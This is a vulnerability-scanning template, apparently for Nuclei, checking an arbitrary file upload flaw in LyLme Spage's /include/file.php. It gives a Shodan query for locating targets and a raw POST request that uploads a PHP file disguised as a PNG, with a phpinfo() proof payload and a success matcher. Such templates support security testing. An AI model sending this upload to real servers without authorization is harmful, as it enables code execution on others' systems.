@@ -1,0 +1,37 @@
+id: lylme_include_file_Upload
+
+info:
+  name: lylme_include_file_Upload
+  author: HK
+  severity: high
+  description: 六零导航页/include/file.php接口存在任意文件上传漏洞
+  metadata:
+    max-request: 1
+    shodan-query: body="六零导航页(LyLme Spage)致力于简洁高效无广告的上网导航和搜索入口"
+    verified: true
+
+http:
+- raw:
+  - |-
+    @timeout: 30s
+    POST /include/file.php HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
+    Accept: application/json, text/javascript, */*; q=0.01
+    Content-Type: multipart/form-data; boundary=---------------------------207262699182048909098055515
+    Content-Length: 229
+
+    -----------------------------207262699182048909098055515
+    Content-Disposition: form-data; name="file"; filename="test.php"
+    Content-Type: image/png
+
+    <?php phpinfo();?>
+    -----------------------------207262699182048909098055515--
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - 上传成功
